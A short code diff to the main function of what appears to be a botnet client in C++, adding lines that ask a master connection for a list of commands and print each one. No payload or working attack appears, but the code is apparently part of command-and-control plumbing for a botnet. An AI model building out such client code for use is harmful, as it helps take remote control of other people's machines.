@@ -12,6 +12,11 @@ int main() {
     typedef botnet::parser parser;
     typedef botnet::master_conn master_conn;
     master_conn *conn = new master_conn();
+    std::cout << "ask for command" << '\n';
+    std::vector<std::string> arr = conn->ask_for_cmd();
+    for (int i = 0; i < arr.size(); i++) {
+        std::cout << ">>>" << arr[i] << '\n';
+    }
 
    /* std::string cmds;
     parser *pcmd;
